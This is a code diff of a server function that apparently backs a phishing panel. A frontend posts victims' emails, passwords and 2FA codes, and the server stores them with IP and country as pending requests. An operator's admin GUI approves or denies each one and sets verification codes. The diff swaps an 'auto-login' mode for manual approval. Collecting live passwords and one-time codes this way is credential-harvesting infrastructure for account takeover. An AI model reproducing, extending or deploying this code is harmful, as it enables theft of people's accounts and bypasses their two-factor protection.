@@ -80,7 +80,7 @@ serve(async (req) => {
           'POST /api/approve - Approve/deny request (manual)',
           'POST /api/delete - Delete request',
           'POST /api/set-verification-code - Set verification code',
-          'POST /api/request - Submit login request (AUTO APPROVE/DENY)',
+          'POST /api/request - Submit login request (MANUAL APPROVAL)',
           'GET /api/check-approval - Check approval status',
           'GET /api/stats - Get request statistics'
         ]
@@ -91,9 +91,7 @@ serve(async (req) => {
         }
       })
     }
-    
-    // Note: Auto-login functions removed for simplified version
-    
+
     // ===== ADMIN GUI ENDPOINTS =====
     
     // Get all pending requests (Admin GUI calls this)
@@ -188,7 +186,7 @@ serve(async (req) => {
       })
     }
     
-    // Approve/deny request (Admin GUI calls this - MANUAL OVERRIDE)
+    // Approve/deny request (Admin GUI calls this - MANUAL)
     if (path === '/api/approve' && req.method === 'POST') {
       const body = await req.json()
       const { id, decision, verificationCode } = body
@@ -330,14 +328,14 @@ serve(async (req) => {
       })
     }
     
-    // ===== FRONTEND ENDPOINTS WITH AUTO-LOGIN =====
+    // ===== SIMPLE FRONTEND ENDPOINTS (NO AUTO-LOGIN) =====
     
-    // Submit login request (Frontend calls this - NOW WITH AUTO APPROVE/DENY)
+    // Submit login request (Frontend calls this - SIMPLE VERSION)
     if (path === '/api/request' && req.method === 'POST') {
       const body = await req.json()
       const { email, password, twofa, userAgent, currentPage } = body
       
-      console.log('🚀 NEW REQUEST with AUTO-LOGIN:', { email, currentPage })
+      console.log('🚀 NEW REQUEST (SIMPLE MODE):', { email, currentPage })
       
       // Get real IP address
       const clientIP = req.headers.get('x-forwarded-for') || 
@@ -375,7 +373,7 @@ serve(async (req) => {
           pageStatus = 'Login'
       }
       
-      // Insert request first with detected country
+      // Insert request with detected country - NO AUTO-LOGIN
       const { data, error } = await supabaseClient
         .from('requests')
         .insert([{
@@ -386,7 +384,7 @@ serve(async (req) => {
           ip: clientIP,
           country: detectedCountry,
           page_status: pageStatus,
-          status: 'pending'
+          status: 'pending' // Always starts as pending
         }])
         .select()
       
@@ -404,11 +402,7 @@ serve(async (req) => {
       const requestId = data[0].id
       console.log('✅ Request inserted with ID:', requestId)
       console.log(`🌍 Country detected: ${detectedCountry} from IP: ${clientIP}`)
-      
-      // 🎯 SIMPLE MODE: NO AUTO-LOGIN - JUST SAVE TO DATABASE
-      console.log('✅ Request inserted with ID:', requestId)
-      console.log(`🌍 Country detected: ${detectedCountry} from IP: ${clientIP}`)
-      console.log('⏳ Status: PENDING - awaiting manual approval (No Auto-Login)')
+      console.log('⏳ Status: PENDING - awaiting manual approval')
       
       // Return success response to frontend
       return new Response(JSON.stringify({
@@ -474,13 +468,14 @@ serve(async (req) => {
       path: path,
       method: req.method,
       project: 'otbswtklpidhezziotac',
+      mode: 'simple',
       available_endpoints: [
         'GET / - Test endpoint',
         'GET /api/pending - Get all pending requests',
         'POST /api/approve - Approve/deny request (manual)',
         'POST /api/delete - Delete request',
         'POST /api/set-verification-code - Set verification code', 
-        'POST /api/request - Submit login request (AUTO APPROVE/DENY)',
+        'POST /api/request - Submit login request (MANUAL APPROVAL)',
         'GET /api/check-approval?email=xxx - Check approval status',
         'GET /api/stats - Get request statistics'
       ]
@@ -495,7 +490,8 @@ serve(async (req) => {
       error: 'Internal Server Error',
       message: error.message,
       stack: error.stack,
-      project: 'otbswtklpidhezziotac'
+      project: 'otbswtklpidhezziotac',
+      mode: 'simple'
     }), {
       headers: { ...corsHeaders, 'Content-Type': 'application/json' },
       status: 500
